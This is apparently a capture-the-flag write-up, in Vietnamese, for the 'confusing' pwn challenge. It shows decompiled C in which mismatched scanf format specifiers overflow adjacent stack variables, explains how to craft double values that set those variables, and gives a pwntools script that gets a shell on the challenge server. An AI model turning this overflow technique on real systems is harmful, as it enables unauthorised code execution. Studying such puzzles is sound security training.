# confusing

## Source code

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int16 v4; // [rsp+2h] [rbp-1Eh] BYREF
  int v5; // [rsp+4h] [rbp-1Ch]
  double v6; // [rsp+8h] [rbp-18h] BYREF
  char s1[4]; // [rsp+14h] [rbp-Ch] BYREF
  unsigned __int64 v8; // [rsp+18h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  init(argc, argv, envp);
  printf("Give me d: ");
  __isoc99_scanf("%lf", &v4);
  printf("Give me s: ");
  __isoc99_scanf("%d", s1);
  printf("Give me f: ");
  __isoc99_scanf("%8s", &v6);
  if ( v5 == 0xFFFFFFFF && v4 == 0x3419 && v6 == 1.6180339887 && !strncmp(s1, "FLAG", 4uLL) )
    system("/bin/sh");
  else
    puts("Still confused?");
  return 0;
}
```

## Khai thác

- Ta thấy biến v4(2byte), v5(4byte) và nằm cạnh nhau. Trong khi `__isoc99_scanf("%lf", &v4);` cho phép nhập 8 byte => tràn biến
- Tuy nhiên đầu vào là `%lf` (double biểu diễn khác với long hay int), do vậy ta cần xem số double nào nhập vào có hex là 0x??ffffffff3419, mình lấy `0x43EFFFFFFFFF3419` == `18446744073602648000` [link convert](https://baseconvert.com/ieee-754-floating-point)

- Tiếp tục sử dụng link convert trên để đổi `1.6180339887 == 0x3FF9E3779B9486E5`
- Cuối cùng là flag FLAG

## script
```python
#!/usr/bin/python3

from pwn import *

exe = ELF('confusing', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*main+160
                b*main+176
                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('2023.ductf.dev', 30024)
else:
        p = process(exe.path)

GDB()
# 18446744073602648000
# 3FF9E3779B9486E5
sla(b'd: ', str(18446744073602648000))
sla(b's: ',str(u32("FLAG")))
sla(b'f: ', p64(0x3ff9e3779b9486e5))
p.interactive()

```